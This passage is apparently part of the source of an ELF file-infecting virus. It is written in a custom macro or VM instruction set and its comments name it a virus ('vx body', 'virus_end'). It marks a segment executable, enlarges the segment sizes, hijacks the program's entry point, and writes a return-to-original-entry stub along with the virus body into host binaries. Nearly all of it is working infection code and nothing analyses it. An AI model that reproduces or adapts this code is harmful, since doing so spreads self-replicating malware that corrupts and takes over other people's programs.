  ; and change the memory protections for this segment to allow executable instructions (0x07 = PT_R | PT_X | PT_W):
  MOV_Rx_Ry(A0_PARAM, 10)
  ADD_Reg_to_Reg(A0_PARAM, 5)
  MOV_B(A2_PARAM, 0x4)
  ADD_Reg_to_Reg(A0_PARAM, A2_PARAM)
  XOR_Rx_Ry(A2_PARAM, A2_PARAM)
  MOV_B(A2_PARAM, 0x07)
  STORE_REG_DW(A2_PARAM, A0_PARAM)
  ; increase p.Filesz with the virus size
  MOV_Rx_Ry(A0_PARAM, 10)
  ADD_Reg_to_Reg(A0_PARAM, 5)
  MOV_B(A2_PARAM, 0x20)
  ADD_Reg_to_Reg(A0_PARAM, A2_PARAM)
  LOAD_REG_DW(A3_PARAM,A0_PARAM)
  MOV_W(A2_PARAM, 0xe,0x8e)
  ADD_Reg_to_Reg(A3_PARAM, A2_PARAM)
  STORE_REG_DW(A3_PARAM,A0_PARAM)
  ; increase p.Memsz with the virus size
  MOV_Rx_Ry(A0_PARAM, 10)
  ADD_Reg_to_Reg(A0_PARAM, 5)
  XOR_Rx_Ry(A2_PARAM, A2_PARAM)
  MOV_B(A2_PARAM, 0x28)
  ADD_Reg_to_Reg(A0_PARAM, A2_PARAM)
  LOAD_REG_DW(A3_PARAM,A0_PARAM)
  MOV_W(A2_PARAM, 0xe,0x8e)
  ADD_Reg_to_Reg(A3_PARAM, A2_PARAM)
  STORE_REG_DW(A3_PARAM,A0_PARAM)
   ; p.Off = uint64(fsize)
  XOR_Rx_Ry(A2_PARAM, A2_PARAM)
  MOV_B(A2_PARAM, 0x20)
  SUB_Reg_to_Reg(A0_PARAM, A2_PARAM)
  STORE_REG_DW(9,A0_PARAM)

  ; compute the new entry point (= a virtual address far from the end of the original program)
  XOR_Rx_Ry(A3_PARAM, A3_PARAM)
  MOV_DW(A3_PARAM, 0x0c,0x0,0x0,0x0)
  ADD_Reg_to_Reg(A3_PARAM, 9)  ; A3 contains the new entrypoint address
  MOV_Rx_Ry(A0_PARAM, 10)
  MOV_B(A2_PARAM, 0x18)
  ADD_Reg_to_Reg(A0_PARAM, A2_PARAM)
  LOAD_REG_DW(A4_PARAM, A0_PARAM) ; save the OEP in A4
  ; patch entrypoint
  STORE_REG_DW(A3_PARAM, A0_PARAM)
  XOR_Rx_Ry(A2_PARAM, A2_PARAM)
  MOV_B(A2_PARAM, 0x8)
  SUB_Reg_to_Reg(A0_PARAM, A2_PARAM)
  ADD_Reg_to_Reg(A0_PARAM, 5)
  STORE_REG_DW(A3_PARAM, A0_PARAM)
  ; ret2oep in pie binary (https://tmpout.sh/1/11.html)
  XOR_Rx_Ry(A5_PARAM, A5_PARAM)
  MOV_W(A5_PARAM,0x10,0x40)
  ADD_Reg_to_Reg(VSP, A5_PARAM)
  MOV_Rx_Ry(A5_PARAM, VSP)
  PUSH_DW(0xff, 0xff, 0xe8, 0xe8)
  PUSH_DW(0x93, 0x2d, 0x48, 0xff)
  PUSH_B(0x1)
  PUSH_DW(0x2d, 0x48, 0x00, 0x00)
  PUSH_R(A3_PARAM)
  PUSH_W(0x05, 0x48)
  PUSH_R(A4_PARAM)
  PUSH_DW(0xff, 0xf4, 0x89, 0x4c)
  PUSH_B(0xe0)
  ; msync syscall: apply the change to the file (-> apply the patches)
  MOV_Rx_Ry(A0_PARAM, 10)
  MOV_Rx_Ry(A1_PARAM, 9)
  XOR_Rx_Ry(A2_PARAM, A2_PARAM)
  MOV_B(A2_PARAM, 0x4)
  SYSCALL(26)
  ; munmap
  SYSCALL(11)
  ; write (the vx body)
  MOV_Rx_Ry(A0_PARAM, 2)
  MOV_W(A2_PARAM, 0x03, 0xbc)
  MOV_Rx_Ry(A1_PARAM, 11)
  SUB_Reg_to_Reg(A1_PARAM, A2_PARAM)
  XOR_Rx_Ry(A2_PARAM, A2_PARAM)
  MOV_W(A2_PARAM, 0xe,0x8e)
  SYSCALL(1)
  ; close
  SYSCALL(3)
  MOV_Rx_Ry(A0_PARAM, 12)
  XOR_Rx_Ry(A1_PARAM, A1_PARAM)
  MOV_B(A1_PARAM,0x02)
  SYSCALL(2)
  MOV_Rx_Ry(A0_PARAM, RET_REG_PARAM)
  ; lseek to write ret2oep stub
  XOR_Rx_Ry(A1_PARAM, A1_PARAM)
  MOV_W(A1_PARAM, 0x01,0x8e)
  ADD_Reg_to_Reg(A1_PARAM, 9)
  XOR_Rx_Ry(A2_PARAM, A2_PARAM)
  SYSCALL(8)
  ; write the stub to ret2oep
  XOR_Rx_Ry(A2_PARAM, A2_PARAM)
  MOV_B(A2_PARAM, 28)
  MOV_Rx_Ry(A1_PARAM, A5_PARAM)
  SYSCALL(1)
  ; close
  SYSCALL(3)
  XOR_Rx_Ry(A5_PARAM, A5_PARAM)
  MOV_W(A5_PARAM,0x10,0x40)
  SUB_Reg_to_Reg(VSP, A5_PARAM)
  JMP_REL(1,191)

  NOP1 ; end !
virus_end:
  nop
